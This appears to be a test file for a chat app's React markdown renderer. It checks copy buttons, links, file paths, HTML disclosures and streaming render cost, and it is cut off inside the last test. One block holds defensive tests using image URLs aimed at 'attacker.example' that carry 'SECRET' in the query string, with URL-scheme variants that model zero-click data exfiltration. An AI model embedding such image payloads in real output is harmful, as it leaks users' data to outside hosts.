// @vitest-environment jsdom
import '@testing-library/jest-dom/vitest';
import React from 'react';
import { describe, it, expect, afterEach, vi } from 'vitest';
import { render, screen, cleanup, fireEvent } from '@testing-library/react';
import MarkdownContent from './MarkdownContent';
import { OPEN_FENCE_CHUNK_LINES } from './markdown-blocks';
import { SessionRefsEnabled } from './session-refs-context';
import { MARKDOWN_STREAM_CORPUS, tokenDeltas, prefixesOf } from '../../../tests/helpers/markdown-stream-corpus';

// Every source string handed to react-markdown, so the streaming cost pins below
// count real parse+highlight passes. Delegates to the real renderer unchanged.
const markdownRenders = vi.hoisted(() => [] as string[]);
vi.mock('react-markdown', async (importOriginal) => {
  const actual = await importOriginal<typeof import('react-markdown')>();
  return {
    ...actual,
    default: (props: { children?: string }) => {
      markdownRenders.push(String(props.children ?? ''));
      return (actual.default as any)(props);
    },
  };
});
// Every character the streaming splitter (markdown-blocks.ts) hands to the
// markdown parser, so the cost pins below see ALL the work an update does, not
// just the react-markdown passes. Only the app's own import of remark-parse is
// wrapped (react-markdown's copy is loaded outside the mock), so this counts the
// splitter alone; it passes through unchanged.
const splitterParsed = vi.hoisted(() => ({ chars: 0 }));
vi.mock('remark-parse', async (importOriginal) => {
  const actual = await importOriginal<typeof import('remark-parse')>();
  return {
    default: function countingRemarkParse(this: any, ...args: any[]) {
      (actual.default as any).apply(this, args);
      const parse = this.parser;
      this.parser = (doc: string, file: unknown) => {
        splitterParsed.chars += doc.length;
        return parse(doc, file);
      };
    },
  };
});
// How many highlighters were built. rehype-highlight builds one (and registers ~37
// languages) each time it is called; the app must call it once, not once per render.
const highlighterBuilds = vi.hoisted(() => ({ n: 0 }));
vi.mock('rehype-highlight', async (importOriginal) => {
  const actual = await importOriginal<typeof import('rehype-highlight')>();
  return { default: (...args: any[]) => { highlighterBuilds.n++; return (actual.default as any)(...args); } };
});
// The reference block resolves ids asynchronously; a fixed stand-in keeps the
// streaming comparisons below about markdown, not about a network answer.
vi.mock('./tool-views/ChatsearchRefBlock', () => ({
  default: ({ shortIds }: { shortIds: string[] }) => <div data-refs={shortIds.join(',')} />,
}));

afterEach(cleanup);

// The regression this pins: the Copy button used to be derived from
// `child.props.children` and only accepted a STRING. rehype-highlight replaces
// the code element's text node with a <span> tree as soon as highlight.js
// recognises ANY token, so the button silently disappeared on exactly the
// blocks worth copying — and survived only on blocks the highlighter failed to
// tokenise. The failure is invisible (a missing button looks like a design
// choice), and `bash` flips between the two states depending on whether the
// snippet happens to contain a comment, so a single sample proves nothing.
// Every variant below must behave identically.
const FENCES: { name: string; md: string; code: string }[] = [
  {
    name: 'no language (highlighter emits no tokens)',
    md: '```\nhello world\n```',
    code: 'hello world\n',
  },
  {
    name: 'bash with nothing colourable',
    md: '```bash\nnpm run build\n```',
    code: 'npm run build\n',
  },
  {
    // The load-bearing case: identical to the one above but for a comment
    // line, which is all it took for highlight.js to tokenise and the button
    // to vanish.
    name: 'bash with a comment',
    md: '```bash\n# install first\nnpm run build\n```',
    code: '# install first\nnpm run build\n',
  },
  { name: 'json', md: '```json\n{"a": 1}\n```', code: '{"a": 1}\n' },
  { name: 'python', md: '```python\ndef f(): return 1\n```', code: 'def f(): return 1\n' },
  { name: 'markdown', md: '```markdown\n# Title\n```', code: '# Title\n' },
  {
    name: 'unknown language',
    md: '```foolang\nabc\n```',
    code: 'abc\n',
  },
];

describe('syntax highlighter', () => {
  // perf-lab 2026-10-04: a fresh highlighter per render was ~1.8 s of a 34 s reply stream.
  it('is built once, not once per render', () => {
    const before = highlighterBuilds.n;
    for (let i = 0; i < 5; i++) {
      const r = render(<MarkdownContent content={'```ts\nconst a = 1;\n```'} />);
      expect(r.container.querySelector('.hljs-keyword')).not.toBeNull();
      r.unmount();
    }
    expect(highlighterBuilds.n - before).toBe(0);
    expect(highlighterBuilds.n).toBeLessThanOrEqual(1);
  });
});

describe('MarkdownContent fenced code blocks', () => {
  for (const f of FENCES) {
    it(`renders a Copy button for ${f.name}`, () => {
      render(<MarkdownContent content={f.md} />);
      expect(screen.getByRole('button', { name: /copy/i })).toBeInTheDocument();
    });

    it(`copies the full source text for ${f.name}`, async () => {
      const writes: string[] = [];
      Object.assign(navigator, {
        clipboard: { writeText: (t: string) => { writes.push(t); return Promise.resolve(); } },
      });
      const { getByRole } = render(<MarkdownContent content={f.md} />);
      getByRole('button', { name: /copy/i }).click();
      // Must be the raw source, not the highlighted markup — the whole point of
      // reading the hast node instead of the rendered children.
      expect(writes).toEqual([f.code]);
    });

    it(`styles ${f.name} as a block, not inline code`, () => {
      const { container } = render(<MarkdownContent content={f.md} />);
      const code = container.querySelector('pre code');
      expect(code).not.toBeNull();
      // text-code is the INLINE styling. A fenced block must never carry it —
      // an unlanguaged fence used to, because "no className" was read as
      // "inline" and an unlanguaged fence gets no class from the highlighter.
      expect(code!.className).not.toContain('text-code');
    });

    it(`keeps the yc-code hook on the <pre> for ${f.name}`, () => {
      const { container } = render(<MarkdownContent content={f.md} />);
      // globals.css out-specifies highlight.js's own `pre code.hljs` box via
      // `pre.yc-code code.hljs`. Drop the class and the double-rectangle
      // regression returns, with nothing else to catch it.
      expect(container.querySelector('pre.yc-code')).not.toBeNull();
    });
  }

  it('leaves inline code as inline', () => {
    const { container } = render(<MarkdownContent content={'some `inline` code'} />);
    expect(container.querySelector('pre')).toBeNull();
    expect(container.querySelector('code')!.className).toContain('text-code');
  });

  it('copies only the block that was clicked when several are present', () => {
    const writes: string[] = [];
    Object.assign(navigator, {
      clipboard: { writeText: (t: string) => { writes.push(t); return Promise.resolve(); } },
    });
    render(<MarkdownContent content={'```json\n{"a": 1}\n```\n\ntext\n\n```python\ndef f(): pass\n```'} />);
    const buttons = screen.getAllByRole('button', { name: /copy/i });
    expect(buttons).toHaveLength(2);
    buttons[1].click();
    expect(writes).toEqual(['def f(): pass\n']);
  });
});

describe('MarkdownContent HTML disclosures', () => {
  const disclosure = [
    '<details>',
    '<summary>Key code evidence</summary>',
    '',
    'The renderer keeps **Markdown** inside the disclosure.',
    '',
    '```ts',
    'const value = 1;',
    '```',
    '',
    '</details>',
  ].join('\n');

  it('renders model-generated details markup as an interactive disclosure', () => {
    const { container } = render(<MarkdownContent content={disclosure} />);
    const details = container.querySelector('details');

    expect(details).not.toBeNull();
    expect(details!.querySelector('summary')).toHaveTextContent('Key code evidence');
    expect(details).toHaveTextContent('The renderer keeps Markdown inside the disclosure.');
    expect(details!.querySelector('strong')).toHaveTextContent('Markdown');
    expect(details!.querySelector('pre code')).toHaveTextContent('const value = 1;');
    expect(container).not.toHaveTextContent('<details>');
    expect(container).not.toHaveTextContent('</details>');
  });

  it('does not expose tags from unsupported HTML blocks', () => {
    const { container } = render(
      <MarkdownContent content={'<aside>\n\nReadable **content**.\n\n</aside>'} />,
    );

    expect(container).toHaveTextContent('Readable content.');
    expect(container).not.toHaveTextContent('<aside>');
    expect(container).not.toHaveTextContent('</aside>');
  });

  it('does not expose or link unsupported HTML attributes', () => {
    const { container } = render(
      <MarkdownContent content={'<span title="> https://example.com">Visible</span>'} />,
    );

    expect(container).toHaveTextContent('Visible');
    expect(container).not.toHaveTextContent('title=');
    expect(container).not.toHaveTextContent('https://example.com');
    expect(container.querySelector('a')).toBeNull();
  });

  it('accepts a blank line between details and summary', () => {
    const spaced = disclosure.replace('<details>\n<summary>', '<details>\n\n<summary>');
    const { container } = render(<MarkdownContent content={spaced} />);

    expect(container.querySelector('details > summary')).toHaveTextContent('Key code evidence');
    expect(container.querySelector('details')).toHaveTextContent('The renderer keeps Markdown inside the disclosure.');
    expect(container).not.toHaveTextContent('</details>');
  });

  it('keeps disclosure markup non-interactive in preview mode', () => {
    const { container } = render(<MarkdownContent content={disclosure} preview />);

    expect(container.querySelector('details')).toBeNull();
    expect(container).toHaveTextContent('Key code evidence');
    expect(container).toHaveTextContent('The renderer keeps Markdown inside the disclosure.');
    expect(container).not.toHaveTextContent('</details>');
  });
});

// ---------------------------------------------------------------------------
// Clickable URLs and file paths.
// The regression this pins: a URL inside backticks (`http://127.0.0.1:8931/`)
// rendered as dead text. remark-gfm only autolinks BARE urls in prose, so
// anything Claude wrapped in code — inline or fenced — could not be clicked.
// ---------------------------------------------------------------------------
describe('MarkdownContent links', () => {
  const hrefs = (c: HTMLElement) =>
    Array.from(c.querySelectorAll('a')).map((a) => a.getAttribute('href'));

  it('links a bare URL in prose', () => {
    const { container } = render(<MarkdownContent content={'see https://example.com now'} />);
    expect(hrefs(container)).toEqual(['https://example.com']);
  });

  it('links a URL inside inline code', () => {
    const { container } = render(<MarkdownContent content={'run `http://127.0.0.1:8931/`'} />);
    expect(hrefs(container)).toEqual(['http://127.0.0.1:8931/']);
    // The link must still LOOK like the code it was written as.
    expect(container.querySelector('code a')).not.toBeNull();
  });

  it('links a URL inside a fenced code block', () => {
    const { container } = render(
      <MarkdownContent content={'```\nopen http://127.0.0.1:8931/\n```'} />,
    );
    expect(hrefs(container)).toEqual(['http://127.0.0.1:8931/']);
    expect(container.querySelector('pre a')).not.toBeNull();
  });

  it('links a URL inside a languaged fenced block (highlighter has already split the text)', () => {
    const { container } = render(
      <MarkdownContent content={'```bash\ncurl https://example.com/api\n```'} />,
    );
    expect(hrefs(container)).toEqual(['https://example.com/api']);
  });

  it('opens links in the system browser, not in the app', () => {
    // target=_blank is what Electron's setWindowOpenHandler turns into
    // shell.openExternal, and what Android's shouldOverrideUrlLoading turns
    // into an ACTION_VIEW intent. Without it the link would navigate the app.
    const { container } = render(<MarkdownContent content={'see https://example.com'} />);
    const a = container.querySelector('a')!;
    expect(a.getAttribute('target')).toBe('_blank');
    expect(a.getAttribute('rel')).toContain('noopener');
  });

  it('never nests a link inside a markdown link', () => {
    const { container } = render(
      <MarkdownContent content={'[the docs](https://example.com/docs)'} />,
    );
    expect(hrefs(container)).toEqual(['https://example.com/docs']);
    expect(container.querySelectorAll('a a')).toHaveLength(0);
  });

  it('keeps the URL in what a code block copies', () => {
    const writes: string[] = [];
    Object.assign(navigator, {
      clipboard: { writeText: (t: string) => { writes.push(t); return Promise.resolve(); } },
    });
    const { getByRole } = render(
      <MarkdownContent content={'```\nopen http://127.0.0.1:8931/\n```'} />,
    );
    getByRole('button', { name: /copy/i }).click();
    expect(writes).toEqual(['open http://127.0.0.1:8931/\n']);
  });

  it('links a URL in a table cell, a heading and bold text', () => {
    // Every one of these is a different parent element in the tree; the token
    // splitter works on text nodes, so all of them must behave the same.
    for (const md of [
      '| a |\n| --- |\n| https://example.com |',
      '## https://example.com',
      '**https://example.com**',
      '> https://example.com',
      '- https://example.com',
    ]) {
      const { container, unmount } = render(<MarkdownContent content={md} />);
      expect(hrefs(container), md).toEqual(['https://example.com']);
      unmount();
    }
  });

  it('renders links as plain text in preview mode', () => {
    const { container } = render(
      <MarkdownContent content={'see https://example.com'} preview />,
    );
    expect(container.querySelector('a')).toBeNull();
    expect(container.textContent).toContain('https://example.com');
  });
});

describe('MarkdownContent file paths', () => {
  const paths = (c: HTMLElement) =>
    Array.from(c.querySelectorAll('button[data-file-path]')).map((b) => b.textContent);

  it('makes an absolute path in prose clickable', () => {
    const { container } = render(
      <MarkdownContent content={'open /home/destin/plan.md'} sessionId="s1" />,
    );
    expect(paths(container)).toEqual(['plan.md']);
  });

  it('makes a path inside inline code clickable', () => {
    const { container } = render(
      <MarkdownContent content={'open `~/notes/todo.md`'} sessionId="s1" />,
    );
    expect(paths(container)).toEqual(['todo.md']);
  });

  it('makes a path inside a fenced code block clickable, showing the whole path', () => {
    // In a code block the chip would break the monospace grid and hide the rest
    // of the command, so the token keeps the path exactly as written.
    const { container } = render(
      <MarkdownContent content={'```bash\ncat /home/destin/plan.md\n```'} sessionId="s1" />,
    );
    expect(paths(container)).toEqual(['/home/destin/plan.md']);
  });

  it('keeps the path in what a code block copies', () => {
    const writes: string[] = [];
    Object.assign(navigator, {
      clipboard: { writeText: (t: string) => { writes.push(t); return Promise.resolve(); } },
    });
    const { getByRole } = render(
      <MarkdownContent content={'```bash\ncat /home/destin/plan.md\n```'} sessionId="s1" />,
    );
    getByRole('button', { name: /copy/i }).click();
    expect(writes).toEqual(['cat /home/destin/plan.md\n']);
  });

  it('makes media, archive and script paths clickable, not just readable documents', () => {
    // Before 2026-09-05 only a short list of viewable types pilled, so a path
    // to an .mp3 or a .zip could not be clicked at all.
    for (const [md, label] of [
      ['play /home/d/song.mp3', 'song.mp3'],
      ['watch /home/d/clip.mp4', 'clip.mp4'],
      ['unzip /home/d/bundle.zip', 'bundle.zip'],
      ['run scripts/deploy.sh', 'deploy.sh'],
    ] as const) {
      const { container, unmount } = render(<MarkdownContent content={md} sessionId="s1" />);
      expect(paths(container), md).toEqual([label]);
      unmount();
    }
  });

  it('leaves paths alone when there is no session to resolve them against', () => {
    const { container } = render(<MarkdownContent content={'open /home/destin/plan.md'} />);
    expect(paths(container)).toEqual([]);
    expect(container.textContent).toContain('/home/destin/plan.md');
  });
});

// 2026-09-10 security review (Destin's "tap to show"): a picture from a WEBSITE
// must not load until the person taps Show — its address can carry stolen text,
// so an auto-loaded remote image is a zero-click exfiltration channel. A data:
// image has no network fetch and renders immediately.
describe('remote images wait for a tap; local images render inline', () => {
  it('a website image renders a Show button, not an <img>, until tapped', () => {
    render(<MarkdownContent content={'![cat](https://attacker.example/p.png?d=SECRET)'} />);
    // No <img> has hit the DOM (no request left the machine).
    expect(document.querySelector('img')).toBeNull();
    const btn = screen.getByRole('button', { name: /image from attacker\.example/i });
    expect(btn).toBeInTheDocument();
    fireEvent.click(btn);
    const img = document.querySelector('img');
    expect(img).not.toBeNull();
    expect(img!.getAttribute('src')).toBe('https://attacker.example/p.png?d=SECRET');
  });

  it.each([
    'https://attacker.example/p.png?d=SECRET',
    'https:attacker.example/p.png?d=SECRET',   // no double slash — browser still fetches it
    'https:/attacker.example/p.png?d=SECRET',  // one slash
    'HTTPS://attacker.example/p.png',          // uppercase scheme
    '//attacker.example/p.png',                // protocol-relative
  ])('gates the website image %s behind Show (no <img> until tapped)', (src) => {
    render(<MarkdownContent content={`![x](${src})`} />);
    expect(document.querySelector('img')).toBeNull();
    expect(screen.getByRole('button', { name: /image from|load image/i })).toBeInTheDocument();
  });

  it('a data: image is never gated as a remote fetch (no Show button)', () => {
    // react-markdown's default urlTransform already drops data: srcs, so the
    // point is only that a data: image is NOT treated as a website fetch.
    render(<MarkdownContent content={'![dot](data:image/png;base64,iVBORw0KGgo=)'} />);
    expect(screen.queryByRole('button', { name: /image from/i })).toBeNull();
  });
});

// Streaming (smoothness sweep A5): a growing reply is drawn piece by piece, and
// the page must be byte-for-byte what drawing the whole text at once gives.
describe('MarkdownContent while a reply streams in', () => {
  // `live` = the reply is still streaming (only then may a long open fence be drawn in chunks).
  // Defaults to `incremental`, i.e. a streaming bubble; pass live={false} for a finished one.
  const Bubble = ({ md, incremental, live = incremental }: { md: string; incremental?: boolean; live?: boolean }) => (
    <SessionRefsEnabled.Provider value={true}>
      <MarkdownContent content={md} sessionId="s1" incremental={incremental} live={live} />
    </SessionRefsEnabled.Provider>
  );
  // The page as markup with each element's attributes in name order. WHY sorted:
  // React appends an attribute it adds to an EXISTING element (a code block's
  // `class` arriving once its language is typed) after the ones already there,
  // so an element updated in place lists them in a different order than a fresh
  // one. Order carries no meaning to the browser, and today's whole-message
  // render updates in place too; everything else — text nodes included — is
  // compared exactly.
  // WHY adjacent text nodes are joined (without touching the page): a long open code
  // fence is drawn in chunks, so one run of plain text can arrive as two text nodes
  // where the whole-message render has one. The browser shows them identically.
  const canonical = (root: Element): string => {
    const parts: string[] = [];
    let text = '';
    const flush = () => { if (text) parts.push(JSON.stringify(text)); text = ''; };
    // A frozen chunk of a still-open fence sits in a plain wrapper span (CSS containment only);
    // it is looked through, since it adds no text and no visible structure.
    const flat = (nodes: Node[]): Node[] => nodes.flatMap((n) => (n.nodeType === 1 && (n as Element).classList.contains('yc-fence-chunk') ? flat(Array.from(n.childNodes)) : [n]));
    for (const n of flat(Array.from(root.childNodes))) {
      if (n.nodeType === 3) { text += n.textContent ?? ''; continue; }
      if (n.nodeType !== 1) continue;
      flush();
      const el = n as Element;
      const attrs = Array.from(el.attributes).map((a) => `${a.name}=${JSON.stringify(a.value)}`).sort().join(' ');
      parts.push(`<${el.tagName.toLowerCase()} ${attrs}>${canonical(el)}</${el.tagName.toLowerCase()}>`);
    }
    flush();
    return parts.join('');
  };
  const wholeHtml = (md: string) => {
    const r = render(<Bubble md={md} />);
    const html = canonical(r.container);
    r.unmount();
    return html;
  };
  const streamAndCompare = (md: string, prefixes: string[]) => {
    const live = render(<Bubble md={prefixes[0]} incremental />);
    for (const prefix of prefixes) {
      live.rerender(<Bubble md={prefix} incremental />);
      expect(canonical(live.container), `after ${JSON.stringify(prefix)}`).toBe(wholeHtml(prefix));
    }
    live.unmount();
  };

  for (const sample of MARKDOWN_STREAM_CORPUS) {
    it(`draws "${sample.name}" exactly like the whole message after every delta`, () => {
      streamAndCompare(sample.md, prefixesOf(tokenDeltas(sample.md)));
    });
  }

  // Where a partial last line can change the block above it, go one character
  // at a time: "#" then "#f", "-" then "- x", a header row then its delimiter.
  for (const name of ['setext headings', 'hash that is not a heading, then a real one', 'dashes: setext, rules and list items', 'table appearing under paragraph lines', 'CRLF line endings']) {
    it(`draws "${name}" exactly like the whole message after every character`, () => {
      const md = MARKDOWN_STREAM_CORPUS.find((s) => s.name === name)!.md;
      streamAndCompare(md, Array.from({ length: md.length }, (_, i) => md.slice(0, i + 1)));
    });
  }

  it('keeps the elements already on screen instead of replacing them as the reply grows', () => {
    const md = MARKDOWN_STREAM_CORPUS.find((s) => s.name === 'long mixed reply')!.md;
    const prefixes = prefixesOf(tokenDeltas(md));
    const live = render(<Bubble md={prefixes[0]} incremental />);
    live.rerender(<Bubble md={prefixes[1]} incremental />);
    const heading = live.container.querySelector('h2')!;
    expect(heading.textContent).toBe('Plan');
    let firstCode: Element | null = null;
    for (const prefix of prefixes.slice(2)) {
      live.rerender(<Bubble md={prefix} incremental />);
      expect(live.container.querySelector('h2')).toBe(heading);
      firstCode ??= prefix.includes('```json') ? live.container.querySelector('pre') : null;
      if (firstCode) expect(live.container.querySelector('pre')).toBe(firstCode);
    }
    expect(firstCode).not.toBeNull();
    live.unmount();
  });

  it('re-draws only the unfinished paragraph per delta, not the finished code blocks above it', () => {
    const body = MARKDOWN_STREAM_CORPUS.find((s) => s.name === 'long mixed reply')!.md.repeat(3);
    const tailWords = tokenDeltas(' and then some closing words that keep arriving one at a time until the end');
    const live = render(<Bubble md={body.slice(0, 10)} incremental />);
    let md = body;
    live.rerender(<Bubble md={md} incremental />);
    md += '\n\nClosing';
    live.rerender(<Bubble md={md} incremental />);
    markdownRenders.length = 0;
    for (const word of tailWords) {
      md += word;
      live.rerender(<Bubble md={md} incremental />);
    }
    // One react-markdown pass per delta, each over the live paragraph alone.
    expect(markdownRenders).toHaveLength(tailWords.length);
    for (const source of markdownRenders) expect(source.startsWith('Closing')).toBe(true);
    live.unmount();
  });

  // Review F2: a raw-HTML block near the top (a comment, a <br>) used to hold
  // everything below it live, so every word re-parsed the whole reply twice.
  it('re-draws only the unfinished paragraph when raw HTML sits near the top', () => {
    const body = '<!-- note -->\n\nTop <br> line\n\n<br>\n\n' + MARKDOWN_STREAM_CORPUS.find((s) => s.name === 'long mixed reply')!.md.repeat(2);
    const live = render(<Bubble md="<!--" incremental />);
    let md = body;
    live.rerender(<Bubble md={md} incremental />);
    md += '\n\nClosing';
    live.rerender(<Bubble md={md} incremental />);
    markdownRenders.length = 0;
    const words = tokenDeltas(' words that keep arriving one at a time');
    for (const word of words) {
      md += word;
      live.rerender(<Bubble md={md} incremental />);
    }
    expect(markdownRenders).toHaveLength(words.length);
    for (const source of markdownRenders) expect(source.startsWith('Closing')).toBe(true);
    expect(canonical(live.container)).toBe(wholeHtml(md));
    live.unmount();
  });

  it('never draws more per word than the whole message while a disclosure is still open', () => {
    const intro = 'Intro paragraph.\n\n<details>\n<summary>Log</summary>\n\n';
    const inside = MARKDOWN_STREAM_CORPUS.find((s) => s.name === 'long mixed reply')!.md;
    const live = render(<Bubble md="Intro" incremental />);
    let md = intro + inside;
    live.rerender(<Bubble md={md} incremental />);
    for (const word of tokenDeltas(' still inside the open disclosure')) {
      markdownRenders.length = 0;
      md += word;
      live.rerender(<Bubble md={md} incremental />);
      const drawn = markdownRenders.reduce((n, s) => n + s.length, 0);
      expect(drawn).toBeLessThanOrEqual(md.length);
      expect(canonical(live.container)).toBe(wholeHtml(md));
    }
    // Closing it pairs the whole run into one real disclosure, as the whole render does.
    for (const word of tokenDeltas('\n\n</details>\n\nAfter it.')) {
      md += word;
      live.rerender(<Bubble md={md} incremental />);
      expect(canonical(live.container)).toBe(wholeHtml(md));
    }
    expect(live.container.querySelector('details > summary')?.textContent).toBe('Log');
    live.unmount();
  });

  // Review F3: the streaming view is state updated during render, so a render
  // React discards (StrictMode runs every render twice) leaves nothing stale.
  it('draws the same page under StrictMode, and when the content is replaced then grows again', () => {
    const md = MARKDOWN_STREAM_CORPUS.find((s) => s.name === 'fenced code with a language')!.md;
    const Strict = ({ text }: { text: string }) => <React.StrictMode><Bubble md={text} incremental /></React.StrictMode>;
    const prefixes = prefixesOf(tokenDeltas(md));
    const live = render(<Strict text={prefixes[0]} />);
    for (const p of prefixes) {
      live.rerender(<Strict text={p} />);
      expect(canonical(live.container), `after ${JSON.stringify(p)}`).toBe(wholeHtml(p));
    }
    // Replaced (not appended to), then growing again from the new text.
    let next = 'A different reply.\n\n- one\n- two';
    live.rerender(<Strict text={next} />);
    expect(canonical(live.container)).toBe(wholeHtml(next));
    for (const word of tokenDeltas('\n\nThen more\n\n```js\nx()\n```\n\nEnd.')) {
      next += word;
      live.rerender(<Strict text={next} />);
      expect(canonical(live.container), `after ${JSON.stringify(next)}`).toBe(wholeHtml(next));
    }
    live.unmount();
  });

  // WHY a named budget (measured 2026-09-28): these fixed-count streaming
  // checks take 1.5–7 s alone, but in verify.sh's full run — every suite and the
  // screenshot checks at once — two of them passed 30 s and timed out while
  // correct. They count work, never clock time, so more time tests nothing less.
  const STREAMING_SWEEP_BUDGET_MS = 120_000;

  // Review F4: seeded random replies, streamed word by word into a bubble that
  // sometimes mounts mid-reply, compared as DRAWN PAGES (not parse trees) with
  // the whole-message render after every word. Mixes in the constructs that act
  // across blocks: disclosures, raw HTML, link definitions, footnotes, pictures.
  it('draws random replies exactly like the whole message after every word, keeping the same elements', () => {
    const FRAGS = ['Para with *em* and `code`.', 'Another line', '# Head', 'Setext', '===', '---', '- item', '  - nested', '1. one',
      '> quote', '```js', 'let x = 1;', '```', '    indented', '| a | b |', '| - | - |', '| 1 | 2 |', '<details>', '<summary>Sum</summary>',
      '</details>', '<details open><summary>Both</summary>', '<!-- c -->', '<br>', '<div>x</div>', '[x]: https://ex.com/x', 'See [x] and [y].',
      '[y]: https://ex.com/y "T"', 'Note[^1].', '[^1]: The note.', '![pic](https://ex.com/p.png)', '![local](./a.png)', 'https://ex.com/page',
      '/tmp/file.txt', '- [ ] task', '***', '', '', '', '',
      // Whole disclosures spanning blank lines, so pairing across pieces is exercised.
      '<details>\n<summary>Sum</summary>\n\nInside **text**\n\n</details>', '<details open><summary>Two</summary>\n\n- in list\n\n</details>',
      '<details>\n\n<summary>Apart</summary>\n\nBody\n\n</details>',
      // Definition runs with no blank lines, duplicate labels, titles on the next line.
      '[a]: /u', '[A]: /v "t"', 'see [c] and [a][]', '   [c]: /c', '[d]:\n/dd', '[d] late', '"title"', '3. three', '2', '\t- tab'];
    let seed = 20260924;
    const rnd = () => (seed = (seed * 1103515245 + 12345) % 2147483648) / 2147483648;
    // A fixed count, not a time box (a time box would test less under load):
    // ~3-4 s here. Thousands of documents, word by word and character by
    // character, passed when this landed.
    for (let docs = 0; docs < 30; docs++) {
      const md = Array.from({ length: 4 + Math.floor(rnd() * 10) }, () => FRAGS[Math.floor(rnd() * FRAGS.length)]).join('\n');
      const prefixes = prefixesOf(tokenDeltas(md));
      if (prefixes.length < 2) continue;
      const mountAt = rnd() < 0.3 ? Math.floor(rnd() * prefixes.length) : 0;
      // `today` is the whole-message render, updated in place as the app does today.
      const live = render(<Bubble md={prefixes[mountAt]} incremental />);
      const today = render(<Bubble md={prefixes[mountAt]} />);
      let liveEls = elementsByPath(live.container);
      let todayEls = elementsByPath(today.container);
      for (const p of prefixes.slice(mountAt)) {
        live.rerender(<Bubble md={p} incremental />);
        today.rerender(<Bubble md={p} />);
        expect(canonical(live.container), `doc ${docs}, after ${JSON.stringify(p)}`).toBe(canonical(today.container));
        // Every element today's render kept through this update, the streamed
        // render kept too (review F1). A footnote arriving is the one documented
        // exception: it switches to the whole-message render once.
        const nextLive = elementsByPath(live.container);
        const nextToday = elementsByPath(today.container);
        if (!p.includes('[^1]:')) {
          for (const [path, el] of nextToday) {
            if (todayEls.get(path) === el) expect(nextLive.get(path), `doc ${docs}, ${path} after ${JSON.stringify(p)}`).toBe(liveEls.get(path));
          }
        }
        liveEls = nextLive;
        todayEls = nextToday;
      }
      live.unmount();
      today.unmount();
    }
  }, STREAMING_SWEEP_BUDGET_MS);

  // What each streamed update costs, in characters: everything the splitter
  // parsed plus everything handed to react-markdown. Today's whole-message
  // render hands react-markdown the whole message once per update — and a
  // react-markdown pass parses AND transforms, highlights and reconciles, so
  // counting a splitter parse as a full pass over the same text overstates our
  // side. Counts, not clock time: the suite runs under load.
  const streamCosts = (mountAt: string, base: string, deltas: string[]) => {
    const live = render(<Bubble md={mountAt} incremental />);
    let md = base;
    if (base !== mountAt) live.rerender(<Bubble md={md} incremental />);
    const costs: { md: string; work: number; drawn: string[] }[] = [];
    for (const d of deltas) {
      md += d;
      splitterParsed.chars = 0;
      markdownRenders.length = 0;
      live.rerender(<Bubble md={md} incremental />);
      costs.push({ md, work: splitterParsed.chars + markdownRenders.reduce((n, x) => n + x.length, 0), drawn: markdownRenders.slice() });
    }
    expect(canonical(live.container)).toBe(wholeHtml(md));
    live.unmount();
    return costs;
  };
  const expectNoMoreThanToday = (costs: { md: string; work: number }[]) => {
    for (const c of costs) expect(c.work, `work after ${JSON.stringify(c.md.slice(-40))}`).toBeLessThanOrEqual(c.md.length);
  };
  const lines = (n: number, line: (i: number) => string) => Array.from({ length: n }, (_, i) => line(i)).join('\n');

  // Each update may extend a link definition, and a definition can change how
  // any block that names it is drawn — but only the blocks that NAME it.
  it('never does more work per word than the whole message while a list of link definitions streams in', () => {
    const body = Array.from({ length: 40 }, (_, i) => `Point ${i} see [source ${i}][${i}] and \`code\`.`).join('\n\n') + '\n\n';
    const defs = lines(40, (i) => `[${i}]: https://example.com/articles/${i}/page "Title ${i}"`);
    const costs = streamCosts('Point', body, tokenDeltas(defs));
    expectNoMoreThanToday(costs);
    // A definition only re-draws the blocks that use its label.
    for (const c of costs) expect(c.drawn.length, `after ${JSON.stringify(c.md.slice(-40))}`).toBeLessThanOrEqual(2);
  }, STREAMING_SWEEP_BUDGET_MS);

  // A reply that ends in one big block with no blank line in it: the splitter
  // must not parse that block again on top of drawing it.
  it('never does more work per word than the whole message while one long list grows', () => {
    const list = lines(150, (i) => `- item ${i} with **bold** and \`code\` and a [link](https://e.com/${i})`);
    expectNoMoreThanToday(streamCosts('Intro', `Intro\n\n${list}\n- last`, tokenDeltas(' words that keep arriving\n- and another item\n- a third')));
  });

  it('never does more work per word than the whole message while one long table grows', () => {
    const table = `| # | name | value |\n| - | - | - |\n${lines(150, (i) => `| ${i} | name ${i} | **v** \`${i}\` |`)}`;
    expectNoMoreThanToday(streamCosts('Intro', `Intro\n\n${table}\n| last`, tokenDeltas(' | row | words |\n| next | row | here |')));
  });

  it('never does more work per word than the whole message while one long quote grows', () => {
    const quote = lines(150, (i) => `> quoted line ${i} with *emphasis* and a [link](https://e.com/${i})`);
    expectNoMoreThanToday(streamCosts('Intro', `Intro\n\n${quote}\n> last`, tokenDeltas(' words that keep arriving\n> and one more line')));
  });

  // Code usually holds blank lines, so this one has them too.
  it('never does more work per word than the whole message while a long code block is still open', () => {
    const code = lines(150, (i) => `  const value${i} = compute(${i}, "string ${i}") + other[${i}];`);
    const costs = streamCosts('Here', `Here:\n\n\`\`\`ts\n${code}\n`, tokenDeltas('  more(1);\n\n  <div>[x]: y</div>\n  after_blank();\n'));
    expectNoMoreThanToday(costs);
  });

  // The perf-lab "D7" class (2026-10-04): one long code fence redrew from its first
  // line on every word, so per-word cost grew with the fence and the thread sat at
  // 100%. Pinned by COUNTING the characters handed to the parser/colourer per word
  // (not milliseconds): once the fence is long, a word must cost the same whether
  // the fence is 200 lines or 800.
  describe('one very long code fence that is still being typed', () => {
    const codeLine = (i: number) => `  const value${i} = compute(${i}, "row-${i}") ?? fallback[${i % 7}]; // step ${i}`;
    const fenceMd = (n: number) => `Here is the file:\n\n\`\`\`ts\nexport function generated() {\n${lines(n, codeLine)}\n`;
    const perWordCost = (n: number) => {
      const deltas = tokenDeltas('  more(1);\n\n  after_blank();\n  const a = 1; // tail words\n');
      return streamCosts('Here', fenceMd(n), deltas).map((c) => c.drawn.reduce((t, x) => t + x.length, 0));
    };

    it('does work per word that does not grow with the fence', () => {
      const short = perWordCost(200);
      const long = perWordCost(800);
      const lineLen = codeLine(500).length + 1;
      // Never more than the live tail (under two chunks of lines) plus the opening.
      const bound = 2 * OPEN_FENCE_CHUNK_LINES * lineLen + 200;
      expect(Math.max(...short)).toBeLessThanOrEqual(bound);
      expect(Math.max(...long)).toBeLessThanOrEqual(bound);
      // ...and the cost of the 800-line fence is not a bigger multiple of the 200-line one's.
      expect(Math.max(...long)).toBeLessThanOrEqual(Math.max(...short) + 2 * lineLen);
    });

    it('draws the same page as the whole message, tail words and Copy included', () => {
